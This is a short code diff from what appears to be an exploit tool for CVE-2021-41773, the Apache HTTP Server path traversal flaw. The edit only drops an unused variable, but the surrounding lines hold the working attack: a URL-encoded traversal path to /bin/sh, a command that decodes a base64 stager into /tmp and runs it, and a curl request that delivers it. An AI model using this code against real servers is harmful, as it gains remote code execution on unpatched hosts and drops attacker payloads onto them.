@@ -10,7 +10,7 @@ def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int, stager: st
     try:
         host = 'http://{0}:{1}'.format(ip_dest, port_dest)
         print('[+] Attempting to gain initial access with CVE-2021-41773 on {}'.format(host))
-        r = requests.get(host)
+        requests.get(host)
         payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh'
         rs = '/bin/bash -c "echo {0} | base64 -d > /tmp/stager.sh && chmod +x /tmp/stager.sh && /tmp/stager.sh"'.format(stager.decode("utf-8"))
         cmd = "curl -s --path-as-is '{1}{2}' --data 'echo Content-Type: text/plain; echo; {0}' &".format(rs, host, payload)
